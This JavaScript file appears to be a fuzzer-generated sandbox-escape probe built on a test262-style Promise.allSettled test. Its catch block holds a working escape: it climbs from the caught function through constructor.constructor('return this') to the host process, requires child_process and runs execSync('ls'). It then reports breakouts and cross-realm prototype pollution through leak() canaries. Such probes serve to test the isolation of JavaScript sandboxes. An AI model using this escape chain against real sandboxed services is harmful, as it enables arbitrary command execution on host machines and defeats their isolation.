try {
    var p1 = Promise.resolve(1);
    var p2 = Promise.resolve(1);
    var p3 = Promise.reject(1);
    var p4 = Promise.resolve(1);
    var resolve = Promise.resolve;
    var getCount = 0;
    var callCount = 0;
    Object.defineProperty(Promise, 'resolve', {
        configurable: true,
        get() {
            let REPLACER = 23;
            getCount += 1;
            return function () {
                throw () => {
                    return () => {
                    };
                };
                callCount += 1;
                return resolve.apply(Promise, arguments);
            };
        }
    });
    Promise.allSettled([
        p1,
        p2,
        p3,
        p4
    ]);
    assert.sameValue(getCount, 1, 'Got `resolve` only once for each iterated value');
    assert.sameValue(callCount, 4, '`resolve` invoked once for each iterated value');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}